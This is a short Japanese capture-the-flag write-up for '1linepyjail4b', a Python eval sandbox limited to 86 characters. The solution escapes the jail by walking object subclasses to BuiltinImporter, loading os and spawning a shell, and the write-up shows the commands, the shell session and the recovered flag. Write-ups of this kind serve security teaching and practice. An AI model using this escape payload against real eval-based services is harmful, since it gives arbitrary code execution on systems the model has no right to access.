# 1linepyjail4b:Misc:100pts
[1 line :)](https://github.com/SECCON/SECCON13_online_CTF/tree/32d98bc7af7159877dd90d96b44f93d00f9e49b3/jail/1linepyjail)  

[1linepyjail4b.tar.gz](1linepyjail4b.tar.gz)  

`nc 34.170.146.252 23825`  

# Solution
ソースと接続先が渡される。  
ソースの主要部分は以下の通りであった。  
```python
print(eval(code, {"__builtins__": None}) if len(code := (input("jail> ").strip())) <= 86 else ":(")
```
86文字以下のpyjailのようだ。  
基本的なテクニックである、`().__class__.__mro__[1].__subclasses__()`から`<class '_frozen_importlib.BuiltinImporter'>`を取り出して`load_module`でosを用いるのが短くて使いやすい。  
以下のように行う。  
```bash
$ echo '().__class__.__mro__[1].__subclasses__()' | nc 34.170.146.252 23825 | sed 's/,/\n/g' | grep -n "<class '_frozen_importlib.BuiltinImporter'>"
123: <class '_frozen_importlib.BuiltinImporter'>
$ nc 34.170.146.252 23825
jail> ().__class__.__mro__[1].__subclasses__()[122].load_module("os").system("sh")
id
uid=1000 gid=1000 groups=1000
ls /
app
bin
boot
dev
etc
flag-60aa52dce15ce59c4307375b2a53c866.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cat /flag-60aa52dce15ce59c4307375b2a53c866.txt
Alpaca{m4ny_m4ny_p1zz4_3v3ryb0dy_h4ppy}
```
目的のものは123番目にあり、flagが得られた。  

## Alpaca{m4ny_m4ny_p1zz4_3v3ryb0dy_h4ppy}